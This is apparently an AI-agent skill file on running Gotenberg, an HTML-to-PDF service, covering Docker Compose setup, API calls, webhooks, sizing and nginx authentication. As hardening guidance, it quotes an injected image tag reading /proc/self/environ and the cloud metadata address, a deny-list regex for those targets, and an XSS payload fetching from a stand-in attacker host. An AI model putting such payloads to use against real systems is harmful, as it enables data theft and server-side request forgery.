---
name: infra-gotenberg
description: Use when running Gotenberg for HTML/Markdown/URL → PDF — Docker Compose, HTTP API engines, sizing, queueing, pitfalls.
metadata:
  added: 2026-05-18
  last_reviewed: 2026-05-18
  type: domain
  status: active
  invokes_shell: false
  shell_reviewed: "valksor 2026-05-18"
  related: [infra-docker-compose, infra-nginx, python-document-pipeline, security]
---

# Infra Gotenberg

**Iron Law: Gotenberg has NO authentication. Bind it to a private Docker network only, or front it with nginx + auth. Treat every Chromium render as a sandboxed browser running attacker-influenced HTML — same posture as a headless browser farm.**

**Versions:** Current `8.16.x` (8.x line active) · Next `9` — _v8 is the supported line; v7 reached EOL in 2024. Pin to `gotenberg/gotenberg:8.16.y` (minor.patch) in prod, never `:8` (minor bumps land routinely)._

## What it is

Single Go binary wrapping headless Chromium + LibreOffice + qpdf + ExifTool + PDFtk + ChromeDriver behind a REST API. Default port `3000`. Handles three input families:

| Endpoint family               | Engine                | Inputs                                              |
| ----------------------------- | --------------------- | --------------------------------------------------- |
| `/forms/chromium/convert/...` | Chromium headless     | HTML / URL / Markdown → PDF                         |
| `/forms/libreoffice/convert`  | LibreOffice headless  | docx / xlsx / pptx / odt / rtf / many more → PDF    |
| `/forms/pdfengines/...`       | qpdf / pdftk / pdfcpu | merge, split, convert PDF/A, encrypt, read metadata |

`myapp` calls Chromium for HTML-templated reports, LibreOffice when a client uploads `.docx`.

## Compose service

```yaml
services:
  gotenberg:
    image: gotenberg/gotenberg:8.16.0 # pin minor.patch; never :8
    restart: unless-stopped
    networks: [internal] # NEVER expose to public
    expose: ["3000"] # to other services on the network only
    # NO ports: — only consumers on `internal` can reach it
    command:
      - "gotenberg"
      - "--api-port=3000"
      - "--api-timeout=120s" # per-request hard cap; default 30s
      - "--chromium-disable-javascript=false" # keep JS for SPA / chart rendering
      - "--chromium-allow-list=^https?://(myapp|internal\\.example\\.com).*"
      # Deny ALL local-FS reads + cloud metadata endpoints — a template-injected `<img src="file:///proc/self/environ">`
      # or `<img src="http://169.254.169.254/...">` otherwise embeds the resolved bytes in the PDF.
      - "--chromium-deny-list=^file://|^https?://(169\\.254\\.169\\.254|metadata\\.google\\.internal|metadata\\.azure\\.com|\\[?fd00:ec2::254\\]?)"
      - "--log-level=info"
      - "--log-format=json"
    healthcheck:
      test: ["CMD", "curl", "-fsS", "http://localhost:3000/health"]
      interval: 30s
      timeout: 5s
      retries: 3
      start_period: 30s
    deploy:
      resources:
        limits: { cpus: "2.0", memory: 2G } # Chromium is hungry; size up for big docs
        reservations: { cpus: "0.5", memory: 512M }

networks:
  internal:
    driver: bridge
    internal: true # no external connectivity
```

`myapp` calls `http://gotenberg:3000/forms/chromium/convert/html` from inside the network; no public port published.

## HTTP API — request shape

Every endpoint is `multipart/form-data` with files as form parts. The **main file must be named `index.html`** for HTML conversions:

```python
import httpx

files = {
    "index.html": ("index.html", html_bytes, "text/html"),
    "header.html": ("header.html", header_bytes, "text/html"),
    "footer.html": ("footer.html", footer_bytes, "text/html"),
    "logo.png": ("logo.png", logo_bytes, "image/png"),
    "style.css": ("style.css", css_bytes, "text/css"),
}
data = {
    "paperWidth": "8.27",                       # A4 inches; use unit suffix in v8 (e.g. "210mm")
    "paperHeight": "11.69",
    "marginTop": "0.5",
    "marginBottom": "0.5",
    "preferCssPageSize": "true",                # respect @page in CSS
    "printBackground": "true",                  # render CSS backgrounds
    "scale": "1.0",
    "waitDelay": "1s",                          # wait after load — for charts
    "waitForExpression": "window.renderComplete === true",  # better than waitDelay
}
r = httpx.post(
    "http://gotenberg:3000/forms/chromium/convert/html",
    files=files, data=data, timeout=180.0,
)
r.raise_for_status()
pdf_bytes = r.content
```

| Endpoint                           | Main part name             | Notes                                                                      |
| ---------------------------------- | -------------------------- | -------------------------------------------------------------------------- |
| `/forms/chromium/convert/html`     | `index.html`               | extra CSS/JS/images as same-form parts; relative-path refs                 |
| `/forms/chromium/convert/url`      | none                       | `url` form field with absolute URL; allow-list it                          |
| `/forms/chromium/convert/markdown` | `index.html` + `*.md`      | wrap markdown in `index.html` that includes the .md via Go template syntax |
| `/forms/libreoffice/convert`       | any of the supported types | LibreOffice picks engine by extension                                      |
| `/forms/pdfengines/merge`          | N PDF files                | order preserved                                                            |
| `/forms/pdfengines/convert`        | PDFs                       | `pdfa=PDF/A-1a` / `PDF/A-2b` / `PDF/A-3b` for archival                     |

## Async / webhook pattern

For long renders (50+ pages, complex SPAs), don't hold the HTTP connection open:

```python
files = {"index.html": ("index.html", html_bytes, "text/html")}
headers = {
    "Gotenberg-Webhook-Url": "http://myapp:8000/internal/pdf-ready",
    "Gotenberg-Webhook-Error-Url": "http://myapp:8000/internal/pdf-failed",
    "Gotenberg-Webhook-Method": "POST",
    "Gotenberg-Webhook-Extra-Http-Headers": '{"X-Job-Id": "abc-123"}',  # JSON
}
httpx.post(
    "http://gotenberg:3000/forms/chromium/convert/html",
    files=files, headers=headers, timeout=10.0,
)
# returns 204; PDF POSTs to webhook on completion
```

The webhook receives the PDF as request body (`Content-Type: application/pdf`). Pair with a job queue (RQ / Celery / dramatiq): submit → job ID → poll → download from S3. **Webhook URLs MUST be built server-side from a fixed base + an app-generated job ID** (`f"{APP_INTERNAL_BASE}/internal/pdf-ready/{job_id}"`); reject anything not matching that base. A user-influenced `Gotenberg-Webhook-Url` is a PDF-exfiltration vector — Gotenberg POSTs the document (with PII) to whatever URL you supply.

## Sizing — Chromium is the cost

- **One Chromium worker per concurrent render.** Default concurrency = number of CPUs. Override with `--chromium-max-queue-size` (default 0 = unbounded).
- **Memory: ~512 MB per active Chromium tab** for typical invoice/report HTML; complex charts (Highcharts, large d3) push to 1 GB+.
- **Throughput**: pin CPU/memory, `--chromium-max-queue-size=8`, run 2-3 replicas behind nginx `least_conn`. Three small > one huge — Chromium has scaling cliffs.
- **LibreOffice is heavier startup, lighter steady-state.** First conversion is ~3s warm-up; subsequent < 1s. The pool is per-process.

## Queueing inside Gotenberg

```
--api-timeout=120s           # hard per-request timeout, returns 504 if exceeded
--chromium-max-queue-size=8  # bounded backlog; 503 when full
--libreoffice-max-queue-size=4
```

Let your job queue retry on 503/504 and back off. **Don't raise `--api-timeout` to infinity** — stuck Chromium tabs leak until process restart.

## Auth — front it with nginx

Gotenberg ships no auth. The "private network" stance covers internal callers; for any caller outside the Docker network:

```nginx
location /gotenberg/ {
    auth_basic "gotenberg";
    auth_basic_user_file /etc/nginx/.htpasswd-gotenberg;
    proxy_pass http://gotenberg:3000/;
    client_max_body_size 50m;
    proxy_read_timeout 180s;
    proxy_send_timeout 180s;
}
```

Generate the htpasswd: `htpasswd -Bc /etc/nginx/.htpasswd-gotenberg svc_account` (bcrypt). Better: mTLS between proxy and any external caller, or a signed JWT — basic auth is the bare minimum.

## Common pitfalls

| Surprise                                        | Cause                                               | Fix                                                                                                                                                   |
| ----------------------------------------------- | --------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| PDF is blank or missing images                  | relative paths in HTML, images not in the multipart | ship every asset as a form part, reference by basename: `<img src="logo.png">`                                                                        |
| Charts render half-loaded                       | network/JS finishes after `domcontentloaded`        | use `waitForExpression` set to a flag your JS sets after rendering, or `waitDelay=3s` as a fallback                                                   |
| `file://` images don't load                     | Chromium sandbox blocks local file access           | inline assets as data URIs OR send via multipart (preferred); avoid `--chromium-allow-file-access-from-files` (security hole)                         |
| LibreOffice converts wrong                      | a font in the docx isn't installed                  | use Gotenberg's `--libreoffice-disable-routes` lockdown only after font audit; or bake font packages into a custom image FROM `gotenberg/gotenberg:8` |
| Headers/footers show but body has no top margin | header overlaps body                                | set `marginTop` larger than `header.html` rendered height; same for footer                                                                            |
| 504 timeout on large PDFs                       | `--api-timeout` too low                             | raise on Gotenberg side AND on the calling HTTP client AND on any nginx in front                                                                      |
| Server memory creeps up over hours              | Chromium tab leak under load                        | restart policy `unless-stopped` + memory limit triggers OOM kill + restart; or schedule a daily `docker compose restart gotenberg`                    |
| `403 Forbidden` from URL endpoint               | allow-list doesn't match                            | regex must match the full URL; test with `--log-level=debug`                                                                                          |

## Anti-patterns

- Exposing `gotenberg:3000` to the public internet — no auth, headless browser for hire
- `image: gotenberg/gotenberg:8` (minor pin) in prod — minor bumps shift header rendering, font fallback
- Synchronous render for >50-page reports — ties up an HTTP worker for minutes; use webhook
- `--chromium-allow-file-access-from-files=true` to "fix" missing images — opens `file:///` exfiltration; ship images via multipart
- Trusting user-uploaded HTML/Markdown unsanitized — Gotenberg renders `<script>` if JS enabled; sanitize first (bleach/DOMPurify)
- Caching PDF by HTML hash without invoice number / timestamp — "regenerated" returns stale

## Red flags

| Thought                                             | Reality                                                                                                                 |
| --------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| "We'll just expose port 3000 to the LAN"            | Anyone on the LAN can render arbitrary HTML, fetch arbitrary URLs through your Chromium, exfiltrate metadata. Front it. |
| "Bigger Gotenberg means more throughput"            | Chromium scales sub-linearly past 8-16 concurrent. Run replicas.                                                        |
| "Sync render is simpler"                            | Until one user submits a 200-page report and your worker pool blocks for 10 minutes.                                    |
| "We'll trust the input HTML, it's our own template" | Until a client field flows in unescaped and renders `<img src=x onerror=fetch('//attacker')>`.                          |

## Hand-off

Compose wiring (networks, healthchecks, secrets, depends_on): `Skill(infra-docker-compose)`. Nginx auth: `Skill(infra-nginx)`. Python pipeline that builds HTML + calls Gotenberg + stores the PDF: `Skill(python-document-pipeline)`. HTML sanitization before render: `Skill(security)`.
